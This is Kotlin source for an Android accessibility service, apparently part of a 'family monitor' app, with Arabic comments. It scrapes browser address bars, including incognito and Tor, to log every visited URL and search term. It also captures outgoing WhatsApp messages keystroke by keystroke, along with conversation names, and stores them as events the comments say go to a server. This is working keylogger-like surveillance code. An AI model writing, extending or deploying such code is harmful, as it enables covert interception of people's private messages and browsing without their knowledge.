package com.family.monitor

import android.accessibilityservice.AccessibilityService
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONObject

/**
 * خدمة الرصد المركزية — v1.6
 *
 * 1) المتصفحات (أي متصفح + التخفي):
 *    قراءة شريط العنوان مباشرة من شجرة النافذة (rootInActiveWindow) عبر معرّفات
 *    شريط العنوان المعروفة لكل متصفح — هذه هي الطريقة الموثوقة التي تُظهر
 *    المواقع الحقيقية وكلمات البحث الحرفية (لا عناوين نوافذ مزعجة).
 *    - نص يشبه رابطًا → حدث BROWSER بالرابط الكامل (الخادم يستخرج كلمة البحث
 *      من روابط محركات البحث ويحولها لحدث بحث تلقائيًا).
 *    - نص عادي (كلمة مكتوبة في شريط البحث) → حدث SEARCH بالنص الحرفي.
 *    - فلترة الضوضاء: الصفحات الداخلية للمتصفح والنصوص المؤقتة (placeholders).
 *
 * 2) واتساب (الرسمي + كل النسخ المعدلة):
 *    - رسائل مرسلة: نقرأ نص حقل الكتابة أثناء الكتابة، وعند الضغط على «إرسال»
 *      أو إفراغ الحقل نسجّل الرسالة كحدث صادر — هذه الطريقة الوحيدة بدون روت،
 *      وتعمل في المحادثات الفردية والمجموعات على حد سواء.
 *    - اسم المحادثة/المجموعة يُلتقط من رأس الشاشة (conversation_title).
 *
 *    ملاحظة: الرسائل الواردة تُرصد من خدمة الإشعارات (WhatsappNotificationService).
 */
class UrlAccessibilityService : AccessibilityService() {

    companion object {
        // المتصفحات المدعومة للرصد
        private val BROWSERS = setOf(
            "com.android.chrome", "org.mozilla.firefox", "org.mozilla.focus",
            "com.microsoft.emmx", "com.opera.browser", "com.opera.mini",
            "com.brave.browser", "com.sec.android.app.sbrowser",   // Samsung Internet
            "com.android.browser", "com.ucbrowser.international",
            "com.google.android.googlequicksearchbox",             // بحث جوجل
            "com.vivaldi.browser", "org.torproject.torbrowser", "com.duckduckgo.mobile.android",
            "com.yandex.browser", "com.kiwibrowser.browser", "mark.via.gp"
        )

        /** مقاطع معرّفات شريط العنوان في المتصفحات (مطابقة جزئية على الـ viewId) */
        private val URL_BAR_ID_HINTS = listOf(
            "url_bar", "urlbar", "url_bar_title", "url_view",
            "location_bar", "locationbar",
            "omnibox", "omnibar",
            "address_bar", "addressbar",
            "search_edit_text", "search_box", "searchbox",
            "browser_toolbar_url", "mozac_browser_toolbar_url",
            "gsa_search_box"
        )

        /** نصوص مؤقتة (placeholder) لا تمثل بحثًا حقيقيًا — مطابقة تامة */
        private val PLACEHOLDER_EXACT = setOf(
            "البحث أو كتابة عنوان ويب", "ابحث أو اكتب عنوان ويب", "بحث أو كتابة عنوان ويب",
            "search or type web address", "search or type url", "type url", "enter web address",
            "search", "بحث", "اكتب عنوان ويب", "عنوان ويب", "url", "http://", "https://",
            "ابحث", "ask anything", "اسأل أي شيء"
        )

        /** بدايات روابط داخلية في المتصفح — ليست مواقع */
        private val SCHEME_NOISE = listOf(
            "chrome://", "chromium://", "about:", "content://", "file://", "intent://",
            "javascript:", "view-source:", "data:", "edge://", "opera://", "browser://",
            "native://", "chrome-native://", "vivaldi://", "brave://", "samsunginternet://"
        )

        private val INCOGNITO_HINTS = listOf(
            "incognito", "وضع التخفي", "خفي", "تصفح خاص", "private browsing", "incognito tab"
        )

        /** أزقة حقول كتابة رسائل واتساب */
        private val WA_INPUT_ID_HINTS = listOf(":id/entry", ":id/input", ":id/chat_text_input", ":id/composer")

        /** أزقة معرّفات عنوان المحادثة في رأس واتساب */
        private val WA_TITLE_ID_HINTS = listOf(
            ":id/conversation_title", ":id/toolbar_title", ":id/action_bar_title",
            ":id/conversation_contact_title", ":id/group_title"
        )

        private var lastText = ""
        private var lastTs = 0L
    }

    private val handler = Handler(Looper.getMainLooper())
    private var scanPending = false

    // حالة التقاط رسائل واتساب المرسلة
    private var pendingOut = ""
    private var pendingOutAt = 0L
    private var convTitle = ""

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val pkg = event.packageName?.toString() ?: return

        if (Config.isWhatsApp(pkg)) {
            handleWhatsApp(event, pkg)
            return
        }
        if (pkg in BROWSERS) {
            scheduleBrowserScan()
        }
    }

    // ------------------------------------------------------------------
    // الجزء الأول: المتصفحات — قراءة شريط العنوان من شجرة النافذة
    // ------------------------------------------------------------------

    private fun scheduleBrowserScan() {
        if (scanPending) return
        scanPending = true
        handler.postDelayed({
            scanPending = false
            scanBrowser()
        }, 350)
    }

    private fun scanBrowser() {
        val root = rootInActiveWindow ?: return
        val pkg = root.packageName?.toString() ?: return
        if (pkg !in BROWSERS) return

        val text = findAddressBarText(root) ?: return
        processAddressText(text, pkg)
    }

    /** البحث عن شريط العنوان داخل شجرة النافذة (معرّف معروف، ثم أي حقل إدخال) */
    private fun findAddressBarText(root: AccessibilityNodeInfo): String? {
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        var visited = 0
        var fallback: String? = null

        while (queue.isNotEmpty() && visited < 600) {
            val node = queue.removeFirst()
            visited++
            try {
                val id = node.viewIdResourceName
                val text = node.text?.toString()

                // 1) مطابقة معرّف شريط العنوان
                if (id != null && text != null) {
                    val idLower = id.lowercase()
                    if (URL_BAR_ID_HINTS.any { idLower.contains(it) }) {
                        return text
                    }
                }
                // 2) احتياط: أول حقل إدخال يحتوي نصًا (شريط العنوان غالبًا حقل إدخال)
                if (fallback == null && text != null && text.isNotBlank() && text.length > 1 &&
                    node.className?.toString()?.contains("EditText", ignoreCase = true) == true
                ) {
                    fallback = text
                }
                for (i in 0 until node.childCount) {
                    node.getChild(i)?.let { queue.add(it) }
                }
            } catch (_: Exception) {
                // الشجرة قد تتغير أثناء القراءة — نتجاهل
            }
        }
        return fallback
    }

    private fun processAddressText(raw: String, pkg: String) {
        val trimmed = raw.trim()
        if (trimmed.isEmpty() || trimmed.length < 2) return
        if (trimmed == lastText && System.currentTimeMillis() - lastTs < 10_000) return

        // نصوص مؤقتة (placeholder) لا تمثل بحثًا
        if (PLACEHOLDER_EXACT.any { trimmed.equals(it, ignoreCase = true) }) return

        // صفحات المتصفح الداخلية ليست مواقع
        val lower = trimmed.lowercase()
        if (SCHEME_NOISE.any { lower.startsWith(it) }) return

        lastText = trimmed
        lastTs = System.currentTimeMillis()

        val incognito = INCOGNITO_HINTS.any { trimmed.contains(it, ignoreCase = true) }

        val json = JSONObject()
        if (looksLikeUrl(trimmed)) {
            val url = if (trimmed.startsWith("http", ignoreCase = true)) trimmed else "https://$trimmed"
            // الخادم يستخرج كلمة البحث من روابط محركات البحث ويحوّل الحدث لبحث تلقائيًا
            json.put("type", "BROWSER").put("url", url).put("title", "")
        } else {
            // نص عادي مكتوب في شريط البحث — عملية بحث حرفية
            json.put("type", "SEARCH").put("title", trimmed.take(300))
        }
        json.put("app", browserName(pkg))
            .put("packageName", pkg)
            .put("incognito", incognito)

        EventStore.addEvent(applicationContext, json)
    }

    /** هل النص يشبه رابط موقع؟ */
    private fun looksLikeUrl(text: String): Boolean {
        if (text.startsWith("http", ignoreCase = true)) return true
        if (text.contains(" ")) return false
        // مثل: youtube.com/watch أو www.x.com — يتطلب دومين بامتداد
        return text.matches(Regex("^[\\w-]+(\\.[\\w-]+)+(:\\d+)?(/.*)?(\\?.*)?"))
    }

    // ------------------------------------------------------------------
    // الجزء الثاني: واتساب — الرسائل المرسلة + اسم المحادثة/المجموعة
    // ------------------------------------------------------------------

    private fun handleWhatsApp(event: AccessibilityEvent, pkg: String) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val cls = event.className?.toString() ?: return
                if (!cls.contains("EditText", ignoreCase = true)) return
                val text = event.text?.joinToString("") { it?.toString() ?: "" } ?: ""

                if (text.isBlank()) {
                    // الحقل فُرغ — غالبًا الرسالة أُرسلت الآن
                    // (نتحقق أن الحقل المفرغ هو حقل الكتابة نفسه وليس حقل البحث داخل المحادثة)
                    val id = event.source?.viewIdResourceName
                    if (id == null || WA_INPUT_ID_HINTS.any { id.lowercase().endsWith(it) }) {
                        flushOutgoing(pkg)
                    }
                } else {
                    // نتحقق أن الحقل هو حقل كتابة الرسالة (وليس البحث داخل المحادثة)
                    val id = event.source?.viewIdResourceName
                    if (id == null ||
                        WA_INPUT_ID_HINTS.any { id.lowercase().endsWith(it) }
                    ) {
                        pendingOut = text.take(1000)
                        pendingOutAt = System.currentTimeMillis()
                    }
                }
            }

            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val node = event.source ?: return
                val id = node.viewIdResourceName?.lowercase() ?: ""
                val desc = node.contentDescription?.toString() ?: ""
                val label = node.text?.toString() ?: ""
                val looksSend = id.endsWith(":id/send") ||
                        desc.contains("send", ignoreCase = true) ||
                        desc.contains("إرسال") ||
                        label.contains("إرسال")
                if (looksSend) flushOutgoing(pkg)
            }

            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                captureConversationTitle(pkg)
            }
        }
    }

    /** قراءة اسم المحادثة/المجموعة من رأس الشاشة */
    private fun captureConversationTitle(pkg: String) {
        val root = rootInActiveWindow ?: return
        if (root.packageName?.toString() != pkg) return

        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        var visited = 0
        while (queue.isNotEmpty() && visited < 300) {
            val node = queue.removeFirst()
            visited++
            try {
                val id = node.viewIdResourceName
                if (id != null) {
                    val idLower = id.lowercase()
                    if (WA_TITLE_ID_HINTS.any { idLower.endsWith(it) }) {
                        val t = node.text?.toString()?.trim()
                        if (!t.isNullOrBlank()) convTitle = t.take(120)
                        return
                    }
                }
                for (i in 0 until node.childCount) {
                    node.getChild(i)?.let { queue.add(it) }
                }
            } catch (_: Exception) {
            }
        }
    }

    /** تسجيل الرسالة المرسلة (تعمل في المحادثات والمجموعات على حد سواء) */
    private fun flushOutgoing(pkg: String) {
        val text = pendingOut.trim()
        pendingOut = ""
        if (text.isEmpty() || text.length < 1) return

        val json = JSONObject()
            .put("type", "WHATSAPP")
            .put("direction", "OUTGOING")
            .put("title", convTitle.ifBlank { "محادثة" }.take(120)) // اسم الشخص/المجموعة
            .put("phone", convTitle.take(40).ifBlank { null } ?: "")
            .put("app", whatsappLabel(pkg))
            .put("packageName", pkg)
            .put("meta", JSONObject().put("text", text.take(500)))
        EventStore.addEvent(applicationContext, json)
    }

    private fun whatsappLabel(pkg: String): String = when (pkg.lowercase()) {
        "com.whatsapp" -> "WhatsApp"
        "com.whatsapp.w4b" -> "WhatsApp Business"
        "com.gbwhatsapp", "com.gbwhatsm", "com.gbwhatsw4b" -> "GBWhatsApp"
        "com.fmwhatsapp" -> "FMWhatsApp"
        "com.yowhatsapp", "com.yowhatsm" -> "YoWhatsApp"
        "com.whatsappplus", "com.wplus" -> "WhatsApp Plus"
        else -> "WhatsApp"
    }

    // ------------------------------------------------------------------

    override fun onInterrupt() {}

    override fun onDestroy() {
        handler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }

    private fun browserName(pkg: String): String = when (pkg) {
        "com.android.chrome" -> "Chrome"
        "org.mozilla.firefox" -> "Firefox"
        "com.microsoft.emmx" -> "Edge"
        "com.opera.browser" -> "Opera"
        "com.brave.browser" -> "Brave"
        "com.sec.android.app.sbrowser" -> "Samsung Internet"
        "com.duckduckgo.mobile.android" -> "DuckDuckGo"
        "com.yandex.browser" -> "Yandex"
        "com.kiwibrowser.browser" -> "Kiwi"
        "mark.via.gp" -> "Via"
        "com.google.android.googlequicksearchbox" -> "بحث Google"
        else -> pkg.substringAfterLast('.').ifBlank { "متصفح" }
    }
}
